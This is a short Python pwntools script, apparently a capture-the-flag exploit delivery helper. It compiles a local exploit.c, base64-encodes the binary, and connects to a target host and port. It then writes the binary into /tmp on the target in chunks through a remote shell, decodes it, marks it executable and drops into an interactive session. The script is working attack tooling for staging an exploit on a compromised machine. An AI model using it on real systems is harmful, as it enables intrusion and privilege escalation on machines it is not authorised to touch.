import base64
import os
from pwn import *

HOST = sys.argv[1]
PORT = sys.argv[2]


def run(cmd):
    io.sendlineafter("$ ", cmd)
    io.recvline()
    return

os.system("musl-gcc -static exploit.c -o exploit")
with open("exploit", "r") as f:
    payload = base64.b64encode(f.read())

os.system("rm ./exploit")

io = remote(HOST, PORT)

run('cd /tmp')
print("[+] Uploading...")
for i in range(0, len(payload), 512):
    print ("{}".format((i + 0.0)/len(payload)))
    run('echo "{}" >> b64solve'.format(payload[i:i+512]))
run('base64 -d b64solve > solve')
run('rm b64solve')
run('chmod +x solve')

io.interactive()
